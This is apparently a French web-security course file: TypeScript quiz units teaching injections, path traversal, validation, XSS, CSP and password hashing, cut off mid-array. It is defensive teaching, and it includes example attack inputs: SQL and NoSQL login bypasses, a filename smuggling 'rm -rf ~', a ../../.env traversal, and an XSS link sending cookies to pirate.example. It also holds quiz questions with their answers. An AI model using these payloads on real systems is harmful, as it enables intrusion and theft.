import { fill, lesson, match, order, qcm, tip, unit, vf } from './dsl';
import type { CourseUnit } from './types';

/**
 * Sécurité des applications web : prépare à la certification DevHub securite-web.
 * Programme : 0 injections et XSS, 1 authentification et sessions, 2 contrôle d’accès,
 * 3 secrets et dépendances, 4 configuration et HTTPS. Une dernière unité couvre CSRF, CORS,
 * téléversements et SSRF. Références : OWASP Top 10 (éditions 2021 et 2025), fiches OWASP Cheat Sheet.
 */
export const units: CourseUnit[] = [
  // ─── Thème 0 : injections ──────────────────────────────────────────────────
  unit(
    'injections',
    'Injections : ne jamais mélanger code et données',
    'Reconnaître une injection SQL, de commande ou NoSQL, la bloquer avec des requêtes paramétrées et valider chaque entrée côté serveur.',
    [
      lesson('injection-sql', 'L’injection SQL', [
        tip(
          'Quand la donnée devient du code',
          "Une injection se produit quand une donnée venue de l’utilisateur est collée telle quelle dans une commande qu’un autre programme va interpréter : une requête SQL, une commande shell, un filtre MongoDB. L’interpréteur ne fait alors plus la différence entre le texte que tu as écrit et celui que l’attaquant a tapé.\n\nExemple classique : une route de connexion qui fabrique sa requête par concaténation. Si quelqu’un saisit comme e-mail ' OR '1'='1' -- la condition devient toujours vraie, et les deux tirets transforment la vérification du mot de passe en commentaire. La base renvoie le premier compte de la table, souvent celui de l’administrateur.\n\nCe que permet une injection SQL :\n• contourner la connexion ;\n• lire toute la base, y compris d’autres tables, avec UNION SELECT ;\n• modifier ou supprimer des données (soldes, commandes, comptes).\n\nL’injection figure dans toutes les éditions du Top 10 de l’OWASP : A03 en 2021 (avec le XSS), A05 en 2025.",
          "// DANGEREUX : la saisie fait partie du SQL\nconst sql =\n  \"SELECT * FROM users WHERE email = '\" + req.body.email +\n  \"' AND mot_de_passe_hash = '\" + hash + \"'\"\n\n// Avec email = ' OR '1'='1' --\n// SELECT * FROM users WHERE email = '' OR '1'='1' --' AND ...",
        ),
        qcm(
          'Ce code est-il sûr ?',
          [
            'Non : id vient de l’URL et peut contenir du SQL',
            'Oui, car un identifiant est toujours un nombre',
            'Oui, si la base est PostgreSQL',
            'Non, mais seulement pour les requêtes DELETE',
          ],
          0,
          'req.params.id est une chaîne choisie par le client. Avec /produits/1 OR 1=1, la requête renvoie tout le catalogue ; avec un UNION SELECT, d’autres tables.',
          'app.get("/produits/:id", async (req, res) => {\n  const r = await db.query("SELECT * FROM produits WHERE id = " + req.params.id)\n  res.json(r.rows)\n})',
        ),
        qcm(
          "Que renvoie la requête de connexion vulnérable si l’e-mail saisi vaut ' OR 1=1 -- ?",
          [
            'Aucune ligne',
            'Toutes les lignes de la table users',
            'Une erreur de syntaxe, à coup sûr',
            'Seulement le compte dont l’e-mail est vide',
          ],
          1,
          "La condition devient email = '' OR 1=1, toujours vraie, et -- met le reste en commentaire. Le code prend souvent la première ligne : l’attaquant est connecté sans mot de passe.",
        ),
        tip(
          'La parade : les requêtes paramétrées',
          'Avec une requête paramétrée (ou préparée), tu envoies à la base d’un côté le texte de la requête avec des emplacements, de l’autre les valeurs. La base analyse la requête avant de recevoir les valeurs : quoi que contienne email, ce sera toujours une simple valeur, jamais du SQL.\n\n• PostgreSQL (pilote pg) : emplacements $1, $2…\n• MySQL (mysql2) et SQLite : emplacements ?\n• Les ORM et constructeurs de requêtes (Prisma, Drizzle, Knex, Sequelize) paramètrent pour toi, sauf dans leurs fonctions « brutes » si tu y concatènes du texte (par exemple $queryRawUnsafe de Prisma).\n\nLimite importante : un emplacement ne remplace qu’une valeur. Un nom de table ou de colonne, ou le sens d’un tri (ASC ou DESC), ne peut pas être paramétré. Pour ceux-là, compare la saisie à une liste blanche écrite dans ton code.\n\nÉchapper les apostrophes à la main est fragile et dépend de la base : laisse le pilote faire ce travail.',
          '// Sûr : la valeur voyage à part\nconst { rows } = await db.query(\n  "SELECT id, nom FROM users WHERE email = $1",\n  [req.body.email],\n)\n\n// Tri choisi par le client : liste blanche\nconst COLONNES = { prix: "prix", date: "cree_le" }\nconst col = COLONNES[req.query.tri] ?? "cree_le"\nawait db.query(`SELECT * FROM produits ORDER BY ${col}`)',
        ),
        fill(
          'Complète la requête paramétrée PostgreSQL.',
          'const { rows } = await db.query(\n  "SELECT id, nom FROM clients WHERE telephone = ___",\n  [telephone],\n)',
          ['$1', '${telephone}', '"telephone"', ':telephone:'],
          '$1',
          'Avec le pilote pg, $1 désigne la première valeur du tableau. ${telephone} dans un gabarit recollerait la saisie dans le SQL : c’est exactement l’injection à éviter.',
        ),
        vf(
          'Remplacer chaque apostrophe par deux apostrophes suffit à se protéger de l’injection SQL.',
          false,
          'L’échappement manuel oublie toujours un cas : champ numérique sans guillemets, encodage particulier, autre base. Les requêtes paramétrées règlent le problème à la racine.',
        ),
        qcm(
          'Le client choisit la colonne de tri (?tri=prix). Comment l’insérer sans risque ?',
          [
            'La comparer à une liste blanche de colonnes autorisées',
            'La passer en paramètre $2',
            'La mettre entre guillemets doubles',
            'L’encoder en base64',
          ],
          0,
          'Un emplacement ne peut contenir qu’une valeur, pas un nom de colonne. On associe donc la saisie à une liste fixe écrite dans le code, avec une valeur par défaut.',
        ),
        match('Associe chaque notion à sa définition.', [
          ['Requête paramétrée', 'Valeurs envoyées séparément du SQL'],
          ['UNION SELECT', 'Lire les lignes d’une autre table'],
          ['-- dans une saisie', 'Mettre en commentaire la suite de la requête'],
          ['Liste blanche', 'Seule défense pour un nom de colonne'],
        ]),
        vf(
          'Un ORM comme Prisma protège même si tu concatènes la saisie dans $queryRawUnsafe.',
          false,
          'Les fonctions « Unsafe » ou « raw » exécutent le texte tel quel. Avec Prisma, utilise $queryRaw en gabarit balisé, qui paramètre chaque ${…}, ou les méthodes classiques (findMany, etc.).',
        ),
      ]),

      lesson('injections-autres', 'Commandes, NoSQL et chemins de fichiers', [
        tip(
          'Le même piège, d’autres interpréteurs',
          'Le shell est un interpréteur comme un autre. child_process.exec lance une commande à travers /bin/sh : si tu y glisses un nom de fichier venu du client, les caractères ; | && $( ) permettent d’enchaîner n’importe quelle commande sur ton serveur. La parade : execFile ou spawn, qui lancent un programme précis avec un tableau d’arguments, sans passer par un shell.\n\nMongoDB n’utilise pas de SQL, mais ses filtres sont des objets. Or express.json() transforme le corps de la requête en objet : un attaquant peut envoyer "motDePasse": { "$ne": null } au lieu d’une chaîne. Le filtre { email, motDePasse } signifie alors « mot de passe différent de null » et correspond au compte visé. C’est l’injection NoSQL. Défense : vérifier que chaque champ est bien une chaîne (typeof, ou mieux un schéma de validation) avant de construire le filtre.\n\nEnfin, eval, new Function et setTimeout avec une chaîne exécutent du JavaScript : ne leur donne jamais une saisie.',
          'import { exec, execFile } from "node:child_process"\n\n// DANGEREUX : nom = "photo.jpg; rm -rf ~"\nexec(`convert ${nom} miniature.png`)\n\n// Sûr : pas de shell, nom reste un argument\nexecFile("convert", [nom, "miniature.png"])',
        ),
        qcm(
          'Pourquoi execFile est-il plus sûr que exec pour lancer une commande avec une saisie ?',
          [
            'Il est plus rapide',
            'Il chiffre les arguments',
            'Il refuse les noms de fichiers trop longs',
            'Il ne passe pas par un shell : ; et | ne sont pas interprétés',
          ],
          3,
          'execFile lance directement le programme avec un tableau d’arguments. Les caractères spéciaux du shell restent du texte ordinaire.',
        ),
        fill(
          'Lance ffmpeg sans shell, avec le nom de fichier comme simple argument.',
          'import { execFile } from "node:child_process"\n\n___("ffmpeg", ["-i", fichier, "sortie.mp3"])',
          ['execFile', 'exec', 'eval', 'system'],
          'execFile',
          'execFile (comme spawn) lance ffmpeg directement, sans /bin/sh : un nom de fichier contenant ; ou | reste un simple argument.',
        ),
        vf(
          'Avec MongoDB, il n’y a pas de SQL, donc aucune injection possible.',
          false,
          'Un objet comme { "$ne": null } ou { "$gt": "" } envoyé en JSON devient un opérateur dans le filtre. Valide le type de chaque champ avant de l’utiliser.',
        ),
        qcm(
          'Quel corps de requête contourne ce code de connexion ?',
          [
            '{ "email": "awa@mail.sn", "motDePasse": "" }',
            '{ "email": "awa@mail.sn", "motDePasse": { "$ne": null } }',
            '{ "email": "awa@mail.sn" }',
            '{ "email": "awa@mail.sn", "motDePasse": "\' OR 1=1" }',
          ],
          1,
          '{ "$ne": null } signifie « différent de null » : le filtre trouve le compte quel que soit son mot de passe. (Et on ne stocke jamais un mot de passe en clair : voir l’unité sur l’authentification.)',
          'const user = await users.findOne({\n  email: req.body.email,\n  motDePasse: req.body.motDePasse,\n})',
        ),
        tip(
          'Traversée de répertoires',
          'Une route qui sert un fichier à partir d’un nom fourni par le client est exposée à la traversée de répertoires (path traversal). Avec ?nom=../../.env, path.join remonte l’arborescence et ton serveur renvoie ses propres secrets.\n\nTrois défenses, de la plus sûre à la moins sûre :\n• ne jamais prendre de chemin du client : il envoie un identifiant, tu retrouves le fichier en base ;\n• sinon, résoudre le chemin complet avec path.resolve puis vérifier qu’il commence bien par le dossier autorisé suivi du séparateur ;\n• refuser les noms qui ne respectent pas un motif strict (lettres, chiffres, tiret, point).\n\nChercher et supprimer « ../ » dans la chaîne ne suffit pas : ....// redevient ../ après le nettoyage, et l’encodage %2e%2e%2f trompe les filtres naïfs.',
          'import path from "node:path"\n\nconst BASE = path.resolve("fichiers")\nconst cible = path.resolve(BASE, req.query.nom)\nif (!cible.startsWith(BASE + path.sep)) {\n  return res.status(400).send("Nom invalide")\n}\nres.sendFile(cible)',
        ),
        order(
          'Remets dans l’ordre la lecture sûre d’un fichier demandé par le client.',
          [
            'const BASE = path.resolve("fichiers")',
            'const cible = path.resolve(BASE, req.query.nom)',
            'if (!cible.startsWith(BASE + path.sep)) return res.sendStatus(400)',
            'res.sendFile(cible)',
          ],
          'On fixe le dossier autorisé, on calcule le chemin absolu réel, on vérifie qu’il reste dans ce dossier, et seulement ensuite on envoie le fichier.',
        ),
        match('Associe chaque interpréteur à l’injection qui le vise.', [
          ['Base SQL', 'Injection SQL'],
          ['/bin/sh', 'Injection de commande'],
          ['Filtre MongoDB', 'Injection NoSQL'],
          ['Système de fichiers', 'Traversée de répertoires'],
          ['eval()', 'Injection de code JavaScript'],
        ]),
      ]),

      lesson('validation', 'Valider chaque entrée côté serveur', [
        tip(
          'Ne fais confiance à aucune entrée',
          'Tout ce qui arrive à ton serveur peut avoir été fabriqué par un attaquant : corps de requête, paramètres d’URL, en-têtes, cookies, fichiers téléversés, et même les appels d’autres services. Un formulaire HTML n’est qu’une façon parmi d’autres d’envoyer une requête : avec curl ou Postman, on envoie ce qu’on veut.\n\nLa validation côté client (attribut required, type="email", contrôles React) améliore le confort de l’utilisateur. La validation côté serveur, elle, protège ton application. Il faut les deux, mais seule la seconde compte pour la sécurité.\n\nRègles d’une bonne validation :\n• liste blanche plutôt que liste noire : décris ce qui est permis, refuse tout le reste ;\n• vérifie le type, la longueur, le format et la plage de valeurs ;\n• refuse avec un code 400 et un message clair, sans « corriger » silencieusement la saisie.\n\nLes bibliothèques de schémas (zod, valibot, joi) font tout cela en quelques lignes et te donnent en prime des types TypeScript.',
          'import { z } from "zod"\n\nconst Paiement = z.object({\n  telephone: z.string().regex(/^\\+?[0-9]{8,15}$/),\n  produitId: z.string().uuid(),\n  quantite: z.number().int().min(1).max(50),\n})\n\nconst r = Paiement.safeParse(req.body)\nif (!r.success) return res.status(400).json({ erreur: "Données invalides" })',
        ),
        vf(
          'Si le formulaire vérifie déjà le format du numéro de téléphone, le serveur peut s’en passer.',
          false,
          'N’importe qui peut appeler ton API sans passer par le formulaire. La validation côté client est un confort, celle du serveur est la vraie barrière.',
        ),
        qcm(
          'Quelle approche de validation est la plus sûre ?',
          [
            'Décrire précisément ce qui est permis et refuser tout le reste',
            'Lister les caractères dangereux et les supprimer',
            'Accepter tout et nettoyer au moment de l’affichage uniquement',
            'Laisser la base de données rejeter ce qui ne lui plaît pas',
          ],
          0,
          'Une liste noire oublie toujours une variante. Une liste blanche (type, format, longueur, plage) ne laisse passer que ce que tu as prévu.',
        ),
        fill(
          'Valide le corps de la requête sans lever d’exception.',
          'const r = Commande.___(req.body)\nif (!r.success) return res.status(400).end()',
          ['safeParse', 'parse', 'check', 'validate'],
          'safeParse',
          'Avec zod, safeParse renvoie un objet { success, data | error } ; parse lève une exception en cas d’échec.',
        ),
        tip(
          'Valider n’est pas échapper, et le serveur recalcule',
          'La validation réduit la surface d’attaque, mais ne remplace pas les défenses propres à chaque sortie. Un nom parfaitement valide comme N’Diaye ou O’Brien contient une apostrophe : il faut quand même des requêtes paramétrées pour la base et un échappement HTML pour l’affichage. Retiens la paire : valider à l’entrée, encoder à la sortie selon le contexte.\n\nAutre réflexe : ne crois jamais une valeur que le serveur peut calculer lui-même. Si le panier envoie { produitId, quantite, prix: 100 } pour un téléphone affiché à 85 000 FCFA, ton serveur ne doit pas lire le prix : il le relit en base à partir de l’identifiant du produit, multiplie par la quantité validée, puis demande le paiement mobile money de ce montant-là.\n\nMême logique pour les remises, les frais de livraison, le rôle d’un utilisateur ou le statut d’une commande : le client propose, le serveur décide.',
        ),
        qcm(
          'Le panier envoie { produitId, quantite: 2, prix: 100 }. Que doit faire le serveur ?',
          [
            'Facturer 200 FCFA, c’est ce que le client a demandé',
            'Refuser toute commande dont le prix paraît bas',
            'Relire le prix du produit en base et calculer le total lui-même',
            'Arrondir le prix au millier supérieur',
          ],
          2,
          'Le prix envoyé par le client est modifiable dans les outils du navigateur. Seul le prix stocké côté serveur fait foi.',
        ),
        vf(
          'Un nom qui passe la validation (lettres, espaces, apostrophe) peut être collé dans une requête SQL sans paramètre.',
          false,
          'L’apostrophe de N’Diaye suffit à casser une requête concaténée. La validation et le paramétrage sont deux couches différentes, il faut les deux.',
        ),
        match('Associe chaque source d’entrée à un exemple.', [
          ['Corps de requête', 'Le JSON d’un formulaire de paiement'],
          ['Paramètre d’URL', 'Le 42 de /commandes/42'],
          ['En-tête', 'User-Agent ou X-Forwarded-For'],
          ['Cookie', 'L’identifiant de session ou une préférence de langue'],
        ]),
        qcm(
          'Quel code HTTP renvoyer quand les données envoyées ne respectent pas le schéma ?',
          ['500 Internal Server Error', '403 Forbidden', '302 Found', '400 Bad Request'],
          3,
          '400 signifie « ta requête est mal formée ». 500 indiquerait une panne de ton côté, et 403 un refus de droits.',
        ),
      ]),
    ],
  ),

  // ─── Thème 0 (suite) : XSS ─────────────────────────────────────────────────
  unit(
    'xss',
    'Cross-site scripting (XSS)',
    'Comprendre comment du JavaScript étranger s’exécute chez tes utilisateurs, encoder chaque sortie selon son contexte et poser un filet de sécurité avec la CSP.',
    [
      lesson('xss-types', 'Les trois familles de XSS', [
        tip(
          'Du script étranger dans ta page',
          'Une faille XSS (cross-site scripting) permet à un attaquant de faire exécuter son JavaScript dans la page de ton site, chez d’autres visiteurs. Ce script tourne avec l’origine de ton site : il voit tout ce que la victime voit et peut faire tout ce qu’elle peut faire.\n\nConcrètement, il peut :\n• lire les données affichées (solde, messages, numéro de téléphone) et les envoyer ailleurs ;\n• agir au nom de la victime : changer son e-mail, envoyer un message, valider un paiement ;\n• lire les cookies qui ne sont pas HttpOnly et le contenu de localStorage, donc des jetons ;\n• remplacer la page par un faux formulaire de connexion.\n\nHTTPS ne change rien : le script arrive par ton propre site, chiffré comme le reste. Dans le Top 10 2021 de l’OWASP, le XSS est rangé avec les injections (A03).',
        ),
        tip(
          'Stockée, réfléchie, DOM',
          '• XSS stockée : le script est enregistré en base (commentaire, nom de boutique, bio) puis affiché à tous ceux qui ouvrent la page. C’est la plus grave, car elle touche chaque visiteur sans action particulière.\n• XSS réfléchie : le script est dans l’URL (?q=<script>…) et le serveur le recopie dans la réponse. L’attaquant doit faire cliquer la victime sur un lien piégé, envoyé par SMS ou messagerie par exemple.\n• XSS DOM : tout se passe dans le navigateur. Ton propre JavaScript lit location.hash, location.search ou un message, puis l’écrit avec innerHTML, document.write ou eval.\n\nDétail utile : une balise <script> insérée par innerHTML ne s’exécute pas. Mais <img src=x onerror="…"> ou <svg onload="…">, si : les attaquants n’utilisent donc presque jamais <script>.',
          '// XSS DOM : le hash de l’URL finit dans innerHTML\nconst nom = decodeURIComponent(location.hash.slice(1))\ndocument.querySelector("#bienvenue").innerHTML = "Bonjour " + nom\n\n// Lien piégé :\n// https://monshop.example/#<img src=x onerror="fetch(\'//pirate.example?c=\'+document.cookie)">',
        ),
        match('Associe chaque type de XSS à un exemple.', [
          ['Stockée', 'Un commentaire piégé affiché à tous les visiteurs'],
          ['Réfléchie', 'Un lien de recherche qui recopie ?q= dans la page'],
          ['DOM', 'Ton JavaScript écrit location.hash avec innerHTML'],
        ]),
        qcm(
          'Un vendeur met <img src=x onerror=…> dans le nom de sa boutique, affiché sur la page d’accueil. Quel type de XSS ?',
          ['Réfléchie', 'DOM uniquement', 'Stockée', 'Ce n’est pas une XSS'],
          2,
          'Le contenu est enregistré en base puis servi à chaque visiteur : c’est une XSS stockée, la plus dangereuse.',
        ),
        vf(
          'Une balise <script> insérée avec innerHTML s’exécute immédiatement.',
          false,
          'Les navigateurs n’exécutent pas un <script> inséré par innerHTML. Mais les attributs d’événement (onerror, onload…) s’exécutent, eux : innerHTML reste dangereux.',
        ),
        vf(
          'Passer le site en HTTPS protège contre le XSS.',
          false,
          'HTTPS protège le transport. Le script de l’attaquant est servi par ton propre site, il est donc chiffré et livré comme le reste.',
        ),
        qcm(
          'Que peut faire un script injecté par XSS dans une session ouverte ?',
          [
            'Rien tant que le cookie de session est HttpOnly',
            'Seulement afficher des alertes',
            'Seulement lire les cookies',
            'Tout ce que l’utilisateur peut faire sur la page, en son nom',
          ],
          3,
          'Le script tourne dans l’origine de ton site : il envoie des requêtes avec les cookies de la victime. HttpOnly l’empêche seulement de lire le cookie.',
        ),
        order(
          'Remets dans l’ordre le déroulé d’une XSS stockée.',
          [
            'L’attaquant publie un commentaire contenant <img src=x onerror=…>',
            'Le serveur enregistre le commentaire sans le modifier',
            'Une victime ouvre la page et le HTML est inséré sans échappement',
            'Le navigateur exécute onerror dans l’origine du site',
            'Le script envoie les données de la victime à l’attaquant',
          ],
          'Stocker la saisie brute n’est pas le problème en soi : c’est l’affichage sans encodage qui transforme le texte en code.',
        ),
      ]),

      lesson('xss-echappement', 'Encoder selon le contexte', [
        tip(
          'Encoder à la sortie',
          'La défense principale contre le XSS est l’encodage à la sortie : au moment d’écrire une donnée dans la page, on transforme les caractères spéciaux du HTML en entités. < devient &lt;, > devient &gt;, & devient &amp;, " devient &quot; et l’apostrophe devient &#39;. Le navigateur affiche alors le texte, il ne l’interprète plus.\n\nTu le fais rarement à la main, car les bons outils encodent par défaut :\n• React, Vue, Svelte et Angular encodent tout ce que tu places entre accolades ;\n• EJS encode avec <%= %> mais pas avec <%- %> ;\n• Handlebars encode avec {{ }} mais pas avec {{{ }}}.\n\nDans le DOM, textContent écrit du texte, innerHTML écrit du HTML. Pour afficher une saisie, textContent suffit presque toujours.\n\nRègle d’or : la version « brute » (<%-, {{{, innerHTML, dangerouslySetInnerHTML, v-html) ne reçoit jamais une donnée venue d’un utilisateur.',
          '// Dangereux\nelt.innerHTML = commentaire.texte\n\n// Sûr : affiché comme du texte\nelt.textContent = commentaire.texte\n\n// EJS\n<p><%= commentaire.texte %></p>  <!-- encodé -->\n<p><%- commentaire.texte %></p>  <!-- brut : à éviter -->',
        ),
        fill(
          'Affiche le prénom saisi sans risque de XSS.',
          'document.querySelector("#salut").___ = "Bonjour " + prenom',
          ['textContent', 'innerHTML', 'outerHTML', 'insertAdjacentHTML'],
          'textContent',
          'textContent traite la valeur comme du texte. Les trois autres interprètent du HTML et exécuteraient un onerror injecté.',
        ),
        match('Associe chaque syntaxe à son comportement.', [
          ['<%= x %> (EJS)', 'Encodé'],
          ['<%- x %> (EJS)', 'Inséré brut'],
          ['{{{ x }}} (Handlebars)', 'Inséré brut aussi'],
          ['{x} (JSX)', 'Encodé par React'],
        ]),
        vf(
          'Dans un composant React, <p>{commentaire}</p> encode automatiquement le contenu.',
          true,
          'React échappe tout texte placé entre accolades. Le danger revient avec dangerouslySetInnerHTML, dont le nom est un avertissement.',
        ),
        tip(
          'Le contexte compte',
          'Encoder pour le HTML protège le texte entre deux balises et les attributs entre guillemets. Mais chaque contexte a ses pièges :\n\n• Attribut sans guillemets : value=<%= x %> se casse avec une simple espace suivie de onfocus=…. Mets toujours les attributs entre guillemets.\n• URL : un lien <a href={site}> avec site = "javascript:voler()" exécute du code au clic, même encodé en HTML et même dans React. Vérifie le protocole avec new URL() et n’accepte que http: et https:.\n• Dans un bloc <script> : n’y colle jamais de données utilisateur. Passe-les par un attribut data-… ou une requête à l’API.\n• Fonctions qui exécutent : eval, setTimeout("…"), new Function, et les gestionnaires onclick écrits en chaîne.\n\nUn champ « site web » sur un profil de développeur ou de boutique est un exemple très courant de faille par URL.',
          'function lienSur(saisie) {\n  try {\n    const u = new URL(saisie)\n    return ["http:", "https:"].includes(u.protocol) ? u.href : null\n  } catch {\n    return null\n  }\n}',
        ),
        qcm(
          'Un profil affiche <a href={profil.siteWeb}>. Quelle valeur reste dangereuse même avec React ?',
          [
            '"https://awa.dev"',
            '"javascript:fetch(\'//pirate.example\')"',
            '"<b>Awa</b>"',
            '"http://localhost:3000"',
          ],
          1,
          'React encode le texte, mais un href en javascript: s’exécute au clic. Il faut valider le protocole de l’URL avant de l’afficher.',
        ),
        fill(
          'N’accepte que les liens web classiques.',
          'const u = new URL(saisie)\nif (!["http:", "https:"].includes(u.___)) throw new Error("Lien refusé")',
          ['protocol', 'host', 'href', 'origin'],
          'protocol',
          'u.protocol vaut par exemple "https:" ou "javascript:". C’est lui qu’on compare à la liste blanche.',
        ),
        qcm(
          'En quoi le caractère < est-il encodé pour un affichage HTML ?',
          ['%3C', '\\u003C', '<<', '&lt;'],
          3,
          '&lt; est l’entité HTML de <. %3C est l’encodage URL, utile dans une adresse, pas dans une page.',
        ),
      ]),

      lesson('xss-defense', 'HTML riche, assainissement et CSP', [
        tip(
          'Quand tu dois afficher du HTML',
          'Parfois tu dois vraiment afficher du HTML venu des utilisateurs : un article mis en forme, la description riche d’un produit, du Markdown converti en HTML. Encoder n’est plus possible, il faut assainir : garder les balises inoffensives (p, strong, a, ul…) et supprimer tout le reste, y compris les attributs d’événement et les liens javascript:.\n\n• Utilise une bibliothèque éprouvée comme DOMPurify, qui part d’une liste blanche et suit les astuces des navigateurs.\n• N’écris jamais ton propre filtre à base d’expressions régulières : le HTML a trop de variantes (majuscules, encodages, balises mal fermées, SVG).\n• Assainis au plus près de l’affichage, au moment où le HTML est inséré.\n• Avec React, dangerouslySetInnerHTML ne reçoit que du HTML passé par l’assainisseur.\n\nPour du Markdown, configure le convertisseur pour refuser le HTML brut, puis assainis quand même le résultat.',
          'import DOMPurify from "dompurify"\n\nfunction Description({ html }) {\n  const propre = DOMPurify.sanitize(html)\n  return <div dangerouslySetInnerHTML={{ __html: propre }} />\n}',
        ),
        qcm(
          'Pour autoriser le gras et les liens dans des descriptions, quelle méthode choisir ?',
          [
            'Une expression régulière qui supprime <script>',
            'Remplacer « on » par « 0n » dans les attributs',
            'Stocker le HTML en base64',
            'Assainir avec une bibliothèque à liste blanche comme DOMPurify',
          ],
          3,
          'Les filtres maison ratent toujours une variante (onerror, svg, majuscules, encodages). DOMPurify ne garde que ce qui est explicitement permis.',
        ),
        fill(
          'Assainis le HTML avant de l’insérer.',
          'zone.innerHTML = DOMPurify.___(descriptionHtml)',
          ['sanitize', 'escape', 'clean', 'purge'],
          'sanitize',
          'DOMPurify.sanitize renvoie une version du HTML débarrassée des scripts, gestionnaires d’événements et URL dangereuses.',
        ),
        tip(
          'La CSP, un filet de sécurité',
          "La Content Security Policy est un en-tête HTTP qui dit au navigateur d’où les scripts, styles, images ou connexions peuvent venir. Avec script-src 'self', seuls les fichiers JavaScript de ton propre domaine s’exécutent : les scripts en ligne et les attributs comme onerror sont bloqués, ce qui neutralise la plupart des XSS même si une erreur d’encodage t’a échappé.\n\n• Si tu as besoin d’un script en ligne, autorise-le avec un nonce aléatoire différent à chaque réponse, plutôt que 'unsafe-inline' qui annule la protection.\n• object-src 'none' et base-uri 'self' ferment d’autres portes connues.\n• La CSP est une deuxième couche : elle ne remplace pas l’encodage.\n\nDe même, un cookie HttpOnly empêche un script de lire la session, mais pas d’envoyer des requêtes au nom de la victime. Chaque défense limite les dégâts, aucune ne suffit seule. On reverra la CSP en détail dans l’unité sur les en-têtes.",
          "Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'self'",
        ),
        vf(
          'Avec une bonne CSP, on peut se passer d’encoder les sorties.',
          false,
          'La CSP est un filet : une politique trop large, un domaine autorisé qui héberge des scripts ou un vieux navigateur, et elle ne protège plus. L’encodage reste la défense principale.',
        ),
        qcm(
          'La page a la CSP script-src \'self\'. Que devient l’injection <img src=x onerror="voler()"> ?',
          [
            'Elle s’exécute normalement',
            'Le gestionnaire onerror est bloqué par la CSP',
            'L’image est bloquée mais le script s’exécute',
            'La page entière refuse de s’afficher',
          ],
          1,
          "Sans 'unsafe-inline', les gestionnaires d’événements en ligne sont interdits : le navigateur bloque le code et le signale dans la console.",
        ),
        vf(
          'Un cookie de session HttpOnly empêche un script XSS d’effectuer des actions au nom de la victime.',
          false,
          'HttpOnly empêche la lecture du cookie en JavaScript. Mais le navigateur l’envoie quand même avec les requêtes lancées par le script : l’attaquant peut agir sans le voler.',
        ),
        match('Associe chaque outil à son rôle.', [
          ['Encodage à la sortie', 'Afficher une saisie comme du texte'],
          ['DOMPurify', 'Garder seulement le HTML inoffensif'],
          ['CSP', 'Bloquer les scripts non autorisés'],
          ['HttpOnly', 'Cacher le cookie au JavaScript'],
        ]),
      ]),
    ],
  ),

  // ─── Thème 1 : authentification et sessions ────────────────────────────────
  unit(
    'authentification',
    'Authentification et sessions',
    'Stocker les mots de passe correctement, protéger la connexion contre les attaques en masse et gérer sessions, cookies et jetons sans faille classique.',
    [
      lesson('hachage', 'Stocker un mot de passe', [
        tip(
          'Ni en clair, ni chiffré, ni haché vite',
          'Ta base finira peut-être par fuiter : sauvegarde mal protégée, injection SQL, ancien employé. Le stockage des mots de passe doit donc rester sûr même si l’attaquant lit toute la table.\n\n• En clair : impensable. Beaucoup d’utilisateurs réutilisent le même mot de passe pour leur e-mail ou leur compte mobile money.\n• Chiffré (de façon réversible) : la clé est sur le même serveur, elle fuit avec le reste.\n• Haché avec MD5, SHA-1 ou SHA-256 : ces fonctions sont conçues pour être rapides, donc une carte graphique en teste un nombre énorme par seconde. Les mots de passe courants tombent vite.\n\nLa bonne réponse est une fonction de hachage lente et salée, faite pour les mots de passe :\n• Argon2id, recommandé en premier par l’OWASP ;\n• bcrypt, très répandu, avec un facteur de coût d’au moins 10 ;\n• scrypt ou PBKDF2 (ce dernier quand une conformité FIPS est exigée).',
        ),
        tip(
          'Le sel et la vérification',
          'Un sel est une valeur aléatoire propre à chaque mot de passe, mélangée avant le hachage. Deux utilisateurs qui ont choisi « Dakar2024 » obtiennent ainsi deux empreintes différentes, et les tables précalculées ne servent plus à rien. Argon2 et bcrypt génèrent le sel tout seuls et le rangent dans la chaîne produite : tu stockes une seule colonne.\n\nPour vérifier, ne recalcule pas et ne compare pas avec === : appelle la fonction de vérification de la bibliothèque, qui relit le sel et les paramètres dans l’empreinte.\n\nBon à savoir :\n• bcrypt ignore tout ce qui dépasse 72 octets : limite la longueur ou passe à Argon2id ;\n• augmente le coût avec les années et ré-hache à la connexion suivante quand les paramètres ont changé (needsRehash avec argon2) ;\n• le hachage est lent exprès : c’est une raison de plus pour limiter le nombre d’essais de connexion.',
          'import argon2 from "argon2"\n\n// Inscription\nconst empreinte = await argon2.hash(motDePasse) // argon2id par défaut\nawait db.query("INSERT INTO users (email, mdp_hash) VALUES ($1, $2)", [email, empreinte])\n\n// Connexion\nconst ok = await argon2.verify(user.mdp_hash, motDePasse)',
        ),
        qcm(
          'Quel choix est recommandé pour stocker les mots de passe d’une nouvelle application ?',
          [
            'SHA-256 avec un sel',
            'MD5 appliqué deux fois',
            'Argon2id',
            'AES-256 avec une clé dans le .env',
          ],
          2,
          'Argon2id est lent et gourmand en mémoire exprès, ce qui freine les attaques par carte graphique. SHA-256 est trop rapide, AES est réversible.',
        ),
        vf(
          'SHA-256 est un bon choix pour les mots de passe, car il est cryptographiquement solide.',
          false,
          'SHA-256 est excellent pour vérifier l’intégrité d’un fichier, justement parce qu’il est rapide. Pour un mot de passe, cette rapidité aide l’attaquant.',
        ),
        qcm(
          'À quoi sert le sel ?',
          [
            'À chiffrer le mot de passe pour pouvoir le relire',
            'À rendre uniques les empreintes de mots de passe identiques',
            'À raccourcir le temps de hachage',
            'À remplacer la fonction de hachage',
          ],
          1,
          'Avec un sel aléatoire par compte, deux mots de passe identiques donnent deux empreintes différentes : l’attaquant doit attaquer chaque compte séparément.',
        ),
        fill(
          'Vérifie le mot de passe saisi avec bcrypt.',
          'const ok = await bcrypt.___(motDePasse, user.mdp_hash)',
          ['compare', 'equals', 'decrypt', 'hash'],
          'compare',
          'bcrypt.compare relit le sel et le coût dans l’empreinte, hache la saisie de la même façon et compare. On ne « déchiffre » jamais une empreinte.',
        ),
        vf(
          'bcrypt ignore les caractères au-delà de 72 octets.',
          true,
          'C’est une limite connue de l’algorithme. Pour des phrases de passe très longues, Argon2id n’a pas cette limite.',
        ),
        order(
          'Remets dans l’ordre une inscription correcte.',
          [
            'Valider l’e-mail et la longueur du mot de passe',
            'Hacher le mot de passe avec Argon2id',
            'Enregistrer l’e-mail et l’empreinte en base',
            'Oublier le mot de passe en clair (ni log, ni stockage)',
          ],
          'Le mot de passe en clair ne doit exister qu’en mémoire, le temps du hachage. Il ne doit jamais apparaître dans un journal.',
        ),
        match('Associe chaque méthode de stockage à son défaut.', [
          ['En clair', 'Lisible par quiconque lit la base'],
